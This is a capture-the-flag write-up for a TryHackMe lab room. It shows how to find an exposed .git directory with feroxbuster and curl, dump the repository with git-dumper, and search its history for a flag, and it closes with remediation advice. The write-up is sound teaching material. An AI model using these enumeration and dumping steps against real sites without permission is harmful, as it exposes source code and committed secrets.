# Room 404 — TryHackMe Writeup

> **Room:** Room 404 (Hacker Holidays 2026 — "The Byte Lotus Hotel") · **Difficulty:** Very Easy
> **Category:** Web / Directory Enumeration (exposed `.git`)
> **Author of writeup:** 0xnyx
> **Goal:** Find exposed source code and recover the flag from it.

> ⚠️ In line with TryHackMe's write-up policy, **no flag is included** — only the method.
> _(Update the room link above once the public URL is live.)_

---

## How to read this writeup

Each step: **Do** → **You get** → **Why / what next**.

---

## Step 1 — Find the exposed repo

**Do** — The app is on port 8080. Directory-brute for version-control leftovers.

```bash
feroxbuster -u http://<TARGET>:8080 -w /usr/share/wordlists/dirb/common.txt
curl -s http://<TARGET>:8080/.git/HEAD
```

**You get**

```
ref: refs/heads/main      <- /.git/ is exposed and browsable
```

**Why / what next** — An exposed `.git/` directory means the **entire source history** is downloadable, including anything a developer committed and later "removed".

---

## Step 2 — Dump and read the source

**Do** — Pull the whole repo down with git-dumper, then read it.

```bash
pip install git-dumper
git-dumper http://<TARGET>:8080/.git/ ./loot
cd loot && git log --all -p | less
```

**You get** — The application source. The flag is committed in the source (or in an earlier commit that was later changed) → **flag**.

**Why / what next** — Grep the dumped tree and history for the flag format:

```bash
grep -rniE 'flag\{|THM\{' .
git log --all -p | grep -iE 'flag\{'
```

---

## The full chain at a glance

| Step | Technique | Result |
|------|-----------|--------|
| 1 | Dir brute → `/.git/` exposed | Source history reachable |
| 2 | `git-dumper` → read tree + history | Flag in source |

## Lessons

- Always probe for `/.git/`, `/.svn/`, `/.hg/` — an exposed VCS dir leaks the whole codebase.
- **`git-dumper`** reconstructs the repo from a dumb-HTTP `.git/`; then `git log -p` shows *deleted* secrets too.
- "Removing" a secret in a later commit doesn't remove it from history.

## Remediation

- Never deploy the `.git/` directory to the web root; block it at the server (`deny .git`).
- Rotate any secret that was ever committed — it lives in history forever.

---

*Write-up for TryHackMe — Room 404 (Hacker Holidays 2026).*
